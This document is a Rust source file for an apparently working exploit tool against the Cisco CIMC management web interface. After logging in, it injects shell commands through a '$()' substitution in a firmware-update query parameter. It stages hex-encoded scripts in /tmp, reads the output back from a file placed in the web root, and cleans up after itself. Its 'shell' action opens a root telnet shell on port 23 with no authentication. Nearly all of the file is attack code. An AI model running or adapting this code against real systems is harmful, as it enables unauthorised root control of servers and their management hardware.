use regex::Regex;
use reqwest;
use elementtree::Element;
use anyhow::{Error, Result, Context};
use crate::libs::arguments::Actions;
use std::{collections::HashMap, time::Duration};
use reqwest::blocking::Client;
use crate::libs::encryption::hash_fnv32;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use rand::Rng;
use std::io::stdin;


#[derive(Clone,Debug)]
pub struct Authenticated {
    pub cookie: Option<String>,
    pub sid: Option<String>,
    pub admin_user: bool
}

fn extract_session_cookie(full_cookie: &str) -> Result<&str> {
    let re = Regex::new(r"sessionCookie=([a-z0-9]{32});").context("unable to compile regex")?;
    
    let captures = re.captures(&full_cookie)
        .context("Failed to find a match for the session cookie")?;
    
    // Extract the first capture group
    let cookie_value = captures.get(1)
        .context("Failed to extract the session cookie value")?
        .as_str();
    Ok(cookie_value)
}

fn build_client(proxy: Option<&str>) -> Result<Client> {
    let mut client_builder = reqwest::blocking::Client::builder();

    if let Some(prox) = proxy {
        let proxy_http = reqwest::Proxy::http(prox)?;
        let proxy_https = reqwest::Proxy::https(prox)?;

        client_builder = reqwest::blocking::Client::builder()
            .proxy(proxy_http)
            .proxy(proxy_https);
    }

    let client = client_builder
        .danger_accept_invalid_certs(true)
        .build()?;

    Ok(client)
}

pub fn login(target: &str, username: &str, password: &str, proxy: Option<&str>, encrypt: fn(&str,&str,Option<Vec<u8>>) -> Result<String>) -> Result<Authenticated,Error> {
    // fix error handling
    println!("Attemting login as: {username}");
	let enc_password = encrypt(username, password,None)?;
    let enc_password_as_string = &enc_password;
    
    let url = format!("{target}/data/login");



    let payload = HashMap::from([
        ("username",username),
        ("password",&enc_password_as_string)
    ]);

    let client = build_client(proxy)?;

    let client_base = client
          .post(&url)
          .header("Referer",format!("{url}.html"))
          .header("Accept-Encoding","identity")
          .json(&payload);

    let response = client_base.send()?;

    if response.status().is_success() {
        println!("success sending login request");
    } else if response.status().is_server_error() {
        return Err(Error::msg("server error!"));
    } else {
        return Err(Error::msg(format!("Something bad happened. Status: {:?}", response.status())));
    }

    let cookie_headers = response
        .headers()
        .clone()
        .get("Set-Cookie") // needs to be lower case?
        .context("should be able to get Set-Cookie")?
        .to_str()?
        .to_string();


    let response_raw = response.bytes()?.to_vec();



    let root = Element::from_reader(response_raw.as_slice())?;

    let auth_result = root.find("authResult")
        .context("Unable to find authResult in response xml")?
        .text();


    if auth_result != "0" {
        return Err(Error::msg(format!("authResult is {auth_result} not 0")));
    }

    let admin_user_text = root.find("adminUser")
        .context("Unable to find adminUser element")?
        .text();

    let admin_user = admin_user_text == "1";


    let sid = root.find("sidValue")
        .context("Unable to find sidValue element")?
        .text();

    let cookie_value = extract_session_cookie(&cookie_headers)?;
    

    let authenticated = Authenticated {
        admin_user : admin_user,
        sid : Some(sid.to_owned()),
        cookie: Some(cookie_value.to_owned())
    };

    Ok(authenticated)
          
}

pub fn logout(target: &str, sid_value: &str,proxy: Option<&str>) -> Result<()> {
    println!("Logging out: {}XXXXXXXXXXXXXXXXXXXXXXXX",sid_value.get(0..8).context("sid value should be at least 8 characters long")?);
    let url = format!("{target}/data/logout");
    let payload = HashMap::from([
        ("sessionID",sid_value)
    ]);
    let client = build_client(proxy)?;

    let client_base = client
        .post(&url)
        .header("Referer",format!("{url}.html"))
        .header("Accept-Encoding","identity")
        .json(&payload);

    let response = client_base.send()?;

    if response.status().is_success() {
        println!("success sending logout request");
    } else if response.status().is_server_error() {
        return Err(Error::msg("server error!"));
    } else {
        return Err(Error::msg(format!("Something bad happened. Status: {:?}", response.status())));
    }

    Ok(())
}

fn query(target: &str, authenticated: &Authenticated, input_cmd: &str, proxy: Option<&str>) -> Result<Element>{
    let url = target.to_string();


    let cmd = utf8_percent_encode(input_cmd, NON_ALPHANUMERIC).to_string();

    let payload = HashMap::from([
        ("sessionID",authenticated.sid.clone().unwrap()),
        ("queryString",cmd)
    ]);

    let client = build_client(proxy)?;

    let client_base = client
          .post(&url)
          .header("Referer",format!("{target}/index.html"))
          .header("Cookie",format!("sessionCookie={}",authenticated.cookie.clone().unwrap()))
          .header("Accept-Encoding","identity")
          .header("Cspg_var",hash_fnv32(&authenticated.sid.clone().unwrap(),input_cmd).context("unable to hash sid and input")?)
          .json(&payload);

    let response = client_base.send()?;

    if response.status().is_success() {
        println!("success sending login request");
    } else if response.status().is_server_error() {
        return Err(Error::msg("server error!"));
    } else {
        return Err(Error::msg(format!("Something bad happened. Status: {:?}", response.status())));
    }


    let response_raw = response.bytes()?.to_vec();


    let root = Element::from_reader(response_raw.as_slice())?;
    Ok(root)
}


fn exec(target: &str, authenticated: &Authenticated,cmd: &str, proxy: Option<&str> ) -> Result<String> {
    let out_file = "/usr/local/www/in.html";
    let web_file = out_file.split("/").last().unwrap_or("in.html"); 
	let tmp_cmd_file = "/tmp/cmd.sh";
	let stager_cmd = format!("sh < {tmp_cmd_file} > {out_file} 2>&1 || true");
	let stager_cmd_file = "/tmp/stager.sh";


	let max_command_length = 100;
	let command_split: Vec<String> = cmd
        .chars()
        .collect::<Vec<char>>()
        .chunks(max_command_length)
        .map(|chunk| chunk.iter().collect())
        .collect::<Vec<String>>();



    // tmp cmd file
    let query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$( >{tmp_cmd_file})\")");
	match query(target, authenticated, &query_command,proxy) {
        Ok(_) => {},
        Err(err) => eprintln!("{:?}",err)

    };

    // cmd split
	for i_cmd in command_split {
            let encoded_command: String = i_cmd.chars()
            .map(|c| format!("\\x{:02x}", c as u8))
            .collect::<Vec<String>>()
            .join("");
            let encoded_query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$(echo -n -e \"{encoded_command}\" >> {tmp_cmd_file}");
		match query(target, authenticated,&encoded_query_command,proxy) {
            Ok(_) => {},
            Err(err) => eprintln!("{:?}",err)
        }
    }
	
    // encoded cmd
    let encoded_command: String = stager_cmd.chars()
    .map(|c| format!("\\x{:02x}", c as u8))
    .collect::<Vec<String>>()
    .join("");
    let encoded_query_command = format!("set=expRemoteFwUpdate(\"1\", \"http\",\"\",\"$(echo -n -e \"{encoded_command}\" >> {stager_cmd_file} )");
    match query(target, authenticated,&encoded_query_command,proxy) {
        Ok(_) => {},
        Err(err) => eprintln!("{:?}",err)
    }

    //stager cmd file
    let query_command = format!("set=expremotefwupdate(\"1\", \"http\",\"\",\"$( sh {stager_cmd_file}  )");
    match query(target, authenticated,&query_command,proxy) {
        Ok(_) => {},
        Err(err) => eprintln!("{:?}",err)
    }

    // read web file
    let client = build_client(proxy)?;



    let url = format!("{target}/{web_file}");
	let response = client.get(&url)
		.header("Referer",format!("{target}/index.html"))
        .header("Accept-Encoding", "identity")
        .send()?;

    // delete tmp files
    let query_command = format!("set=expremotefwupdate(\"1\", \"http\",\"\",\"$(rm -f {tmp_cmd_file} {stager_cmd_file} {out_file}))");
    match query(target, authenticated,&query_command,proxy) {
        Ok(_) => {},
        Err(err) => eprintln!("{:?}",err)
    }

	if response.status().is_success() {
		return Ok(response.text()?);
    }
    else {
        return Err(Error::msg(format!("unable to read output file {url}")));
    }
}

pub fn get_host_info(target: &str, authenticated: &Authenticated, proxy: Option<&str>) -> Result<()>{
    let response = query(target, authenticated, "get=sessionData",proxy)?;
	if response.find("status").context("Should have status")?.text() == "ok" {
		let session_data = response.find("sessionData").context("cannot find session data")?;
		println!("cimcIp: {}",response.find("cimcIp").context("Unable to find value")?.text());
		println!("lzt: {}",session_data.find("lzt").context("Unable to find value")?.text());
		println!("sysPlatformId: {}",session_data.find("sysPlatformId").context("Unable to find value")?.text());
		println!("sessionId: {}",session_data.find("sessionId").context("Unable to find value")?.text());
		println!("canClearLogs: {}",session_data.find("canClearLogs").context("Unable to find value")?.text());
		println!("canAccessKvm: {}",session_data.find("canAccessKvm").context("Unable to find value")?.text());
		println!("canExecServerControl: {}",session_data.find("canExecServerControl").context("Unable to find value")?.text());
		println!("canConfig: {}",session_data.find("canConfig").context("Unable to find value")?.text());
		println!("intersightMode: {}",session_data.find("intersightMode").context("Unable to find value")?.text());
    }
	else {
		let err = response.find("status").context("Unable to find value")?.text();
        return Err(Error::msg(format!("Error with getting host information: {err}")));
    }
    Ok(())
}

pub fn run_test(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()>{
     let test_num = rand::thread_rng().gen_range(1111..9999);
     let test_results = exec(target,authenticated,&format!("echo -n {test_num}"),proxy).context("could not exploit vulnerability, cannot see output on webserver")?;

    if test_results.contains(&test_num.to_string()) {
        println!("🟩 Success! {test_num} given, {test_results} returned");
    }
    else {
        println!("🟥Could not exploit the vulnerability! Response file exists but output does not match. {test_results}");
        return Err(Error::msg(format!("Failed to exploit vulerbility for {test_results}")));
    }
    Ok(())
}

pub fn run_command(target: &str,authenticated: &Authenticated,cmd: Option<&str>,proxy: Option<&str>) -> Result<()> {
    
    let cmd = cmd.context("Need to provide a command when using action cmd")?;

    println!("CIMC:/$ {cmd}");
    let out = exec(target,authenticated,cmd,proxy);
    match out {
    Ok(output) => println!("{output}"),
    Err(err) => println!("something went wrong: {err}")

    }
    Ok(())
}

pub fn run_shell(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> {
    println!("Warning: This will open up port 23 on the Cisco CIMC interface connected to the network.\nThe shell will provide root access with NO authentication.");
    let mut input = String::new();
    stdin().read_line(&mut input)?;
    
    if input.to_lowercase() == "yes" || input.to_lowercase() == "y" {
        let cmd = "busybox telnetd -l /bin/sh -p 23";
        println!("CIMC:/$ {cmd}");
        let out = exec(target,authenticated,cmd,proxy);
        match out {
            Ok(output) => println!("Success: {output}"),
            Err(err) => println!("Something went wrong: {err}")
        }
    }
    else {
        println!("no confirmation, aborting...");
    }

    Ok(())
}

pub fn run_dance(target: &str,authenticated: &Authenticated,proxy: Option<&str>) -> Result<()> {
    let cmd = "sh -c 'for i in 1 2 3 4 5 6 7 8 9 10; do /etc/plumas1/etc/scripts/LED.sh ON && sleep 0.1 && /etc/plumas1/etc/scripts/LED.sh OFF && sleep 0.1; done'";
    println!("");
    let out = exec(target,authenticated,cmd,proxy);
    match out {
        Ok(output) => println!("Success: {output}"),
        Err(err) => println!("Something went wrong: {err}")
    }

    let sleep_seconds = Duration::from_millis(500);
    println!("\\^o^/");
    for _ in 0..8 {
        println!("\\^o^/");
        std::thread::sleep(sleep_seconds);
        println!("/^o^\\");
        std::thread::sleep(sleep_seconds);
    }
    println!("/^o^\\");

    Ok(())
}

pub fn handle_action(action: &Actions,target: &str,authenticated: &Authenticated,cmd: Option<&str>,proxy: Option<&str>) -> Result<()> { 
    match action {
        Actions::Test => run_test(target, authenticated, proxy)?,
        Actions::Cmd => run_command(target, authenticated,cmd,proxy)?,
        Actions::Shell => run_shell(target, authenticated, proxy)?,
        Actions::Dance => run_dance(target, authenticated, proxy)?
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use crate::libs::encryption::encrypt;
    use httpmock::prelude::*;

    use super::*;
    #[test]
    fn login_test() {

        let server = MockServer::start();

        let mock = server.mock(|when, then| {
            when.method(POST)
                .path("/data/login");
            then.status(200)
                .header("Set-Cookie", "sessionCookie=123456789012345678901234567890ab;")
                .body("
                       <?xml version=\"1.0\" encoding=\"UTF-8\"?>
                       <data>
                       <authResult>0</authResult>
                       <adminUser>0</adminUser>
                       <sidValue>SIDVALSIDVALSIDVAL</sidValue>
                       </data>
                ");
        });




        let auth = login(&server.url(""), "usertest123", "pass123", None, encrypt).unwrap();

        mock.assert();
        assert!(auth.sid.unwrap() == "SIDVALSIDVALSIDVAL");
        assert!(auth.cookie.unwrap() == "123456789012345678901234567890ab");
        assert!(!auth.admin_user);

    }
}


